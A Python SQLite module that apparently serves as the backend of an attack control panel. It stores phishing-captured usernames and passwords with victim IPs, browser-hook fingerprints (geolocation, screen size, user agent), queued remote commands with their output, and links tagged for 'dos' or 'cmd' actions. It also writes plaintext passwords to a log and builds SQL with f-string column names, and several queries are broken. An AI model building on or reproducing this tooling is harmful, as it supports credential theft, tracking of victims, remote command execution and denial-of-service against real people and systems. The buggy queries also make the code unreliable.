import sqlite3
import random
import os
import filelock
import datetime

def log(event):
    lock = filelock.FileLock('counter.lock')
    log_file = "log.txt"
    event_rec = datetime.datetime.now()
    with lock:
        with open(log_file,"a") as f:
            f.write("[  "+str(event_rec)+"  ]"+" : "+str(event)+"\n")

def db_path():
    db_folder = "db"
    path_chack = os.path.isdir(db_folder)
    if path_chack:
        db_folder += "/"
        log("Using db folder....")
        return db_folder
    else:
        log("Creating db Folder....")
        os.mkdir(db_folder)
        db_folder += "/"
        return db_folder

def DB_NAMES(db = "Development"):
    db_names = {
                "Development":"development.db",
                "Testing":"testing.db",
                "Production":"production.db"
            }
    try:
        db_name = db_names[db]
        log(f"Env Virble changed to {db}")
        return db_name
    except Exception as e:
        log("couldn't change the db_name to the Env virble need: db_name={db_name} Err={e}")
        return "couldn't change the db_name to the Env virble need"


def conn(db_name):
    path = db_path()
    conn = sqlite3.connect(path + db_name)
    return conn

def create_tables(conn):
    queries = [
        """
        CREATE TABLE USERS (
            EMAIL VARCHAR(50) PRIMARY KEY,
            PASSWORD VARCHAR(20)
        );
        """,
        """
        CREATE TABLE API_COMMAND (
            EMAIL VARCHAR(20) PRIMARY KEY,
            CMD VARCHAR(20),
            OUTPUT VARCHAR,
            CONDITION TEXT
        );
        """,
        """
        CREATE TABLE API_LINK (
            EMAIL VARCHAR(20) PRIMARY KEY,
            LINK VARCHAR(20),
            ACTION_TYPE TEXT,
            CONDITION TEXT
        );
        """,
        """
        CREATE TABLE FISHING (
            EMAIL VARCHAR(20) PRIMARY KEY,
            IP VARCHAR(50),
            USERNAME VARCHAR(50),
            PASSWORD VARCHAR(20)
        );
        """,
        """
        CREATE TABLE HOOKING (
            EMAIL VARCHAR(20) PRIMARY KEY,
            IP VARCHAR(20),
            LON INT,
            LAT INT,
            SCREEN_H INT,
            SCREEN_W INT,
            APP_NAME TEXT,
            APP_CODE_NAME VARCHAR(20),
            PRODUCT_NAME VARCHAR(50),
            USER_AGENT VARCHAR,
            PLATFORM VARCHAR(50)
        )
        """
    ]
    
    #print("Creating database tables...")
    cur = conn.cursor()
    try:
        for query in queries:
            cur.execute(query)
            conn.commit()
        log(f"Database tables created successfully: path={db_path()}")
        return True
        #print("Database tables created successfully")
    except Exception as e:
        #print(e)
        log(e)

def user(conn, state, Email = None, Password = None):
    cur = conn.cursor()
    if state == "login":
        try:
            cur.execute("SELECT * FROM USERS WHERE EMAIL = ? AND PASSWORD = ?", (Email, Password))
            data = cur.fetchall()
            if not(data):
                log(f"Login Falied: Email={Email} , Password={Password}")
                return False
            else:
                log(f"Login Successfully: Email={Email} , Password={Password}")
                return True
                
        except Exception as e:
            return False
    elif state == "update":
        try:
            cur.execute("UPDATE USERS SET PASSWORD = ? WHERE EMAIL = ?", (Password, Email))
            conn.commit()
            log(f"Update Successfully: Email={Email} , Password={Password}")
            return True
        except Exception as e:
            log(f"Update Falied: Email={Email} , Password={Password}")
            return False
    elif state == "add_user":
        try:
            cur.execute("INSERT INTO USERS VALUES (?, ?)", (Email, Password))
            conn.commit()
            log(f"Added User Successfully: Email={Email} , Password={Password}")
            return True
        except Exception as e:
            log(f"Falied to Add the User: Email={Email} , Password={Password}")
            return False

def Api_command(conn,state,Email=None,cmd = None, output = None):
    condition = "False"
    cur = conn.cursor()
    if state == "fetch":
        try:
            cur.execute("SELECT * FROM API_COMMAND WHERE = ?;",(Email,))
            data = cur.fetchall()
            log("Fetching Successfully: Table <Api_Command>")
            return data
        except Exception as e:
            log(f"Fetching Failed: Table <Api_Command> Err= {e}")
            return "Failed"
    elif state == "add_com":
        output="None"
        char_len = 4
        try:
            cur.execute("INSERT INTO API_COMMAND VALUES (?, ?, ?, ?)", (Email, cmd, output, condition))
            conn.commit()
            log("Added Successfully: Table <Api_Command>")
            return "Successfully"
        except Exception as e:
            log(f"Adding Failed Email={Email},command={cmd},output={output},condition={condition}: To <Api_Command> Err = {e}")
            return "Failed"

def Api_link(conn, state, Email=None, action_type = None,link = None):
    condition = "False"
    cur = conn.cursor()
    if state == "fetchall":
        try:
            cur.execute("SELECT * FROM API_LINK WHERE Email = ?;",(Email,))
            data = cur.fetchall()
            log("Fetching Successfully: Table <Api_Link>")
            return data
        except Exception as e:
            log(f"Failed all to Fetching Data: Table <Api_Link> Err = {e}")
            return "Failed"
    elif state == "fetch_all_dos":
        try:
            cur.execute("SELECT * FROM API_LINK WHERE ACTION_TYPE = ? AND CONDITION = ? AND Email = ?;",(action_type,condition,Email))
            data = cur.fetchall()
            log("Fetching dos Successfully: Table <Api_Link>")
            return data
        except Exception as e:
            log("Failed To Fetch dos: Table <Api_Link>")
            return "Failed"
    elif state == "fetch_all_cmd":
        try:
            cur.execute("SELECT * FROM API_LINK WHERE ACTION_TYPE = ? AND CONDITION = ? AND Email = ?;",(action_type,condition,Email))
            data = cur.fetchall()
            log("Fetching cmd Successfully: Table <Api_Link>")
            return data
        except Exception as e:
            log(f"Failed To Fetch cmd: Table <Api_Link> Err = {e}")
            return "Failed"

    elif state == "add_link":
        try:
            cur.execute("INSERT INTO API_LINK VALUES (?, ?, ?, ?)", (Email, link, action_type, condition))
            conn.commit()
            log("Added Successfully: Table <Api_Link>")
            return True
        except Exception as e:
            log(f"Adding Failed Email={Email},Link={link},action_type={action_type},condition={condition}: Table <Api_Link> Err = {e}")
            return False

def fishing(conn,state,Email=None,IP = None,Username = None,Password = None):
    cur = conn.cursor()
    if state == "fetch":
        cur = conn.cursor()
        try:
            cur.execute("SELECT * FROM FISHING WHERE Email = ?;",(Email,))
            data = cur.fetchall()
            log("Fetching Successfully: Table <Fishing>")
            return data
        except Exception as e:
            log(f"Failed To Fetch Info: Table <Fishing> Err = {e}")
            return "Failed"
    elif state == "add":
        try:
            cur.execute("INSERT INTO FISHING VALUES (?,?,?,?)", (Email,IP,Username,Password))
            conn.commit()
            log("Added Successfully: to <Fishing>")
            return "Successfully"
        except Exception as e:
            log(f"Adding Failed Email={Email},IP={IP},Username={Username},Password={Password}: Table <Fishing> Err = {e}")
            return "Failed"

def hooking(conn,state,Email=None,IP = None ,Lon = None,Lat = None,sw = None,sh = None,app_name = None,app_code = None,user_agent = None):
    cur = conn.cursor()
    if state == "fetch":
        cur = conn.cursor()
        try:
            cur.execute("SELECT * FROM HOOKING WHERE Email = ?;",(Email,))
            data = cur.fetchall()
            log("Fetching Info Successfully: Table <Hooking>")
            return data
        except Exception as e:
            log(f"Failed To Fetch Data: Table=<Hooking> Err = {e}")
            return "Failed"
    elif state == "add":
        try:
            cur.execute("INSERT INTO HOOKING VALUES (?,?,?,?,?,?,?,?,?,?,?)", (Email,IP,Lon,Lat,sw,sh,app_name,app_code,user_agent))
            conn.commit()
            log("Adding Data Successfully: Table=<Hooking>")
            return True
        except Exception as e:
            log(f"Adding Data Failed Email={Email},IP={IP},Lon={Lon},Lat={Lat},Screen_w={sw},Screen_h{sh},app_name={app_name},app_code={app_code},User_agent={user_agent}: To <Hooking> Err = {e}")
            return False

def Update(conn,state,setFild,setData,Email):
    cur = conn.cursor()
    if state == "api_link":
        try:
            cur.execute(f"UPDATE API_LINK SET {setFild} = ? WHERE Email = ?", (setData, Email))
            conn.commit()
            log(f"Update Successfully: Table=<Api_link>")
            return True
        except Exception as e:
            log(f"Update Failed SetData={setData},Email={Email}: Table=<Api_link> Err={e}")
            return False
    elif state == "api_command":
        try:
            cur.execute(f"UPDATE API_COMMAND SET {setFild} = ? WHERE Email = ?", (setData, Email))
            conn.commit()
            log(f"Update Successfully: Table=<Api_command>")
            return True
        except Exception as e:
            log(f"Update Failed SetData={setData},Email={Email}: Table=<Api_command> Err={e}")
            return False
def Delete(conn,state,Email):
    cur = conn.cursor()
    if state == "cmd":
        try:
            cur.execute("DELETE from API_COMMAND where Email = ?",(Email,))
            conn.commit()
            log(f"Delete Successfully Email={Email}: Table=<Api_command>")
            return True
        except Exception as e:
            log(f"Delete Failed Email={Email}: Table=<Api_command> Err={e}")
            return False
    elif state == "hooking":
        try:
            cur.execute("DELETE from HOOKING where Email = ?",(Email,))
            conn.commit()
            log(f"Delete Successfully Email={Email}: Table=<Api_Hooking>")
            return True
        except Exception as e:
            log(f"Delete Failed Email={Email}: Table=<Hooking> Err={e}")
            return False
    elif state == "link":
        try:
            cur.execute("DELETE from API_LINK where Email = ?",(Email,))
            conn.commit()
            log(f"Delete Successfully Email={Email}: Table=<Api_link>")
            return True
        except Exception as e:
            log(f"Delete Failed Email={Email}: Table=<Api_link> Err={e}")
            return False
    elif state == "fishing":
        try:
            cur.execute("DELETE from FISHING where Email = ?",(Email,))
            conn.commit()
            log(f"Delete Successfully Email={Email}: Table=<Fishing>")
            return True
        except Exception as e:
            log(f"Delete Failed Email={Email}: Table=<Fishing> Err={e}")
            return False


